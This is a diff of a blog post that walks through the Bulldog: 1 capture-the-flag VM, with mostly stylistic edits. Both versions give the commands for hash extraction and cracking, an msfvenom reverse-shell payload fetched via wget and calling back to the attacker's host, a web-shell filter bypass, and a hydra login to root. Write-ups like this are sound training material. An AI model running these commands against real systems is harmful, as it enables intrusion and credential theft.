@@ -16,7 +16,7 @@ This post documents the complete walkthrough of Bulldog: 1, a boot2root [VM][1] 
 <!--more-->
 
 ### Background
-Bulldog Industries had its website defaced and owned by the malicious German Shepherd Hack Team. Could this mean there are more vulnerabilities to exploit? Why don't you find out? :)
+Bulldog Industries has its website defaced and gets owned by the malicious German Shepherd Hack Team. Could this mean there are more vulnerabilities to exploit? Why don't you find out? :smile:
 
 ### Information Gathering
 
@@ -42,15 +42,15 @@ PORT     STATE SERVICE REASON         VERSION
 |_http-title: Bulldog Industries
 ```
 
-Let's explore the web service first. This is how the site looked like as rendered by a browser.
+Let's explore the web service first. This is how the site looks like in my browser.
 
 ![screenshot-1](/assets/images/posts/bulldog-walkthrough/screenshot-1.png)
 
-The HTML source of the landing page as well as its internal link did not provide a clue on how to proceed.
+There's no clue in the HTML source of the landing page as well as its internal link, on how to proceed.
 
 ### Directory/File Enumeration
 
-Let's use `gobuster` with `common.txt` from [SecLists][4] to enumerate the site and see what we can discover.
+Let's use `gobuster` with `common.txt` from [SecLists][4] to look for directories and/or files.
 
 ```
 # gobuster -w /usr/share/seclists/Discovery/Web_Content/common.txt -e -u http://192.168.36.3
@@ -70,15 +70,15 @@ http://192.168.36.3/robots.txt (Status: 200)
 =====================================================
 ```
 
-The `robots.txt` probably doesn't conform to specifications or it'll will appear in the `nmap` scan. Now, I've two more directories - `admin` and `dev`.
+The `robots.txt` probably doesn't conform to specifications or it'll appear in the `nmap` scan. Now, I've two more directories — `admin` and `dev` to explore.
 
 ### Under Development
 
-This page contained interesting information. There's a link to `/dev/shell`, purportedly a web shell. Under the hood in the HTML source, there were SHA1 password hashes of members from the development team.
+This page `/dev` contains interesting information. There's a link to `/dev/shell`, I suppose, a web shell. Under the hood of the HTML source, there are SHA1 password-hashes of members from the development team.
 
 ![screenshot-2](/assets/images/posts/bulldog-walkthrough/screenshot-2.png)
 
-Let's clean up the hashes and submit to John the Ripper for offline cracking.
+Let's clean up the hashes and send them to John the Ripper for offline cracking.
 
 ```
 # curl -s 192.168.36.3/dev/ | sed '49,55!d' | awk -F': ' '{ print $2 }' | sed -r -e 's/(<br>)+<!--/:/' -e 's/-->/:::::/' > hashes.txt && john --format=raw-sha1 --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
@@ -87,7 +87,7 @@ nick@bulldogindustries.com:bulldog:::::
 sarah@bulldogindustries.com:bulldoglover:::::
 ```
 
-Thank goodness authentication is a must to use the web shell.
+Thank goodness authentication is a must, to use the web shell.
 
 ![screenshot-3](/assets/images/posts/bulldog-walkthrough/screenshot-3.png)
 
@@ -99,11 +99,11 @@ Let's use one of the credentials (`nick:bulldog`) and see if we can authenticate
 
 ![screenshot-5](/assets/images/posts/bulldog-walkthrough/screenshot-5.png)
 
-We saw a session established with the site. Now, are we able to use the web shell by going to `/dev/shell`?
+I have a session with the site. Now, are we able to use the web shell by going to `/dev/shell`?
 
 ![screenshot-6](/assets/images/posts/bulldog-walkthrough/screenshot-6.png)
 
-Sweet. The web shell appeared to restrict itself to certain commands.
+Sweet. The web shell appears to restrict itself to certain commands.
 
 ### Command Substitution
 
@@ -115,7 +115,7 @@ One of my favorite features in `bash` is [command substitution][5] using backtic
 
 ### Low Privilege Shell
 
-Let's transfer (using `wget`) a single-stage reverse shell payload and then run a reverse shell back to me. I can do that with `msfvenom` and Metasploit multi-handler.
+Let's transfer (using `wget`) a single-stage reverse shell payload and then run a reverse shell back. I can do that with `msfvenom` and Metasploit multi-handler.
 
 ```
 # msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.36.4 LPORT=443 -f elf -o bulldog
@@ -127,13 +127,13 @@ Let's transfer (using `wget`) a single-stage reverse shell payload and then run 
 
 ![screenshot-10](/assets/images/posts/bulldog-walkthrough/screenshot-10.png)
 
-Boom. A low-privilege shell appeared but let's spawn a pseudo-TTY for better output control.
+Although a low-privilege shell appears, let's spawn a pseudo-TTY for better output control.
 
 ![screenshot-11](/assets/images/posts/bulldog-walkthrough/screenshot-11.png)
 
 ### Privilege Escalation
 
-During enumeration, I found two users: `django` and `bulldogadmin`. They were able to `sudo` as `root`. It's a shame I don't have their passwords.
+I find two users — `django` and `bulldogadmin`, during enumeration. They can `sudo` as `root`. It's a pity I don't have their passwords.
 
 ![screenshot-12](/assets/images/posts/bulldog-walkthrough/screenshot-12.png)
 
@@ -141,7 +141,7 @@ During enumeration, I found two users: `django` and `bulldogadmin`. They were ab
 
 ![screenshot-14](/assets/images/posts/bulldog-walkthrough/screenshot-14.png)
 
-Noticed `.hiddenadmindirectory` in the home directory of `bulldogadmin`?
+Notice `.hiddenadmindirectory` in the home directory of `bulldogadmin`?
 
 ![screenshot-15](/assets/images/posts/bulldog-walkthrough/screenshot-15.png)
 
@@ -149,7 +149,7 @@ Noticed `.hiddenadmindirectory` in the home directory of `bulldogadmin`?
 
 ![screenshot-17](/assets/images/posts/bulldog-walkthrough/screenshot-17.png)
 
-Seemed like reverse engineering the ELF binary is my ticket to `root`.
+Seems like reverse engineering the ELF binary is my ticket to `root`.
 
 ### What the ELF?
 
@@ -157,7 +157,7 @@ The first thing to do in reverse engineering is to look for interesting strings 
 
 ![screenshot-18](/assets/images/posts/bulldog-walkthrough/screenshot-18.png)
 
-If you look past the "`H`", you'll see "`SUPERultimatePASSWORDyouCANTget`". I'll hit the jackpot if this is the password belonging to any of the users since they can all `sudo` to `root`. Let's find out with `hydra`.
+If you look past the "`H`", you see "`SUPERultimatePASSWORDyouCANTget`". I'll have my work cut short if this is the password belonging to any of the users, since they can `sudo` to `root`. Let's find out with `hydra`.
 
 ```
 # cat users.txt
@@ -180,11 +180,11 @@ It's done.
 
 ### Afterthought
 
-If I have to guess, I'll say the other way to get root is perhaps through the Dirty CoW exploit as hinted in the notice page.
+If I have to guess, I say the other way to get root is perhaps through the Dirty CoW exploit as hinted in the notice page.
 
 ![screenshot-21](/assets/images/posts/bulldog-walkthrough/screenshot-21.png)
 
-Well, to an attacker, a shell is a shell is a shell. Period. :smiling_imp:
+To an attacker, a shell is a shell is a shell.
 
 [1]: https://www.vulnhub.com/entry/bulldog-1,211/
 [2]: https://twitter.com/@frichette_n
